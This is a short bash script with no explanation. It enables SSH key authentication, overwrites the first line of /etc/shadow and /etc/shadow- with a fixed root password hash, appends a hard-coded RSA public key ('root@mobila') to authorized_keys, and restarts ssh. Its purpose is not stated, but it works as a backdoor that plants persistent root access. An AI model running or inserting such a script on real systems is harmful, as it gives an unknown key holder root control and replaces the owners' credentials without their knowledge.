#!/bin/bash

sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/g' -i /etc/ssh/sshd_config

sed '1d' -i /etc/shadow

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow

sed '1d' -i /etc/shadow-

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-

sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiGivf3+H99JRik9MHGGuGeoll2t5mmsxdbdwRHnZ8xEPbq/P7Qmh/phw29OcmZTQvuLBlDiosVl3c+oNZe1oC2FOoQItcqnnhD8WoFEt0hw//K6WyojOi3cKEQH58+9tR+Hkb4mhEGzJ23bzpGbplTk032+AQuhP+UfhyPRI6Tfe6JGTd/HmXTfIoO2O6usQpRHguZWCz6uZD3kxR9e9k+Bjrs9gJ4m22O7wyiKRedoPUFVgPf01rRG0ElsZaQFXBpHIe+JKVfJA1+8BwvdsOKzKfZ+TE7aZar+a161cr6QgF8wVMM1Vgnb/UcsosfZucbY15ZbuDaE2PEmnSTC31 root@mobila' >> ~/.ssh/authorized_keys"

systemctl restart ssh
